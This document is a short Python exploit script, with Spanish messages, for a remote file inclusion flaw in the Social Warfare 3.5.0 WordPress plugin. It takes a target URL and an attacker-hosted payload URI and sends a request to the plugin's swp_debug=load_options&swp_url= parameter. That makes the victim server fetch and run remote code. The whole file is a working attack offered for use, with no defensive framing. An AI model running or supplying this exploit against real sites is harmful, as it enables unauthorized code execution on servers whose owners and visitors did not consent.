#!/usr/bin/env python3
import requests
import sys

print("\n[+] Social Warfare 3.5.0 - RFI Exploit\n")

if len(sys.argv) != 5:
    print("Uso: python3 exploit.py -t <target_url> --payload-uri <http://attacker/payload.txt>")
    sys.exit(1)

target = sys.argv[2] + "/wp-admin/admin-post.php?swp_debug=load_options&swp_url="
payload = sys.argv[4]

print("[>] Enviando Payload a:", target + payload)

try:
    r = requests.get(target + payload, timeout=10)
    print("[*] Respuesta del servidor:\n")
    print(r.text)
except Exception as e:
    print("Error:", e)
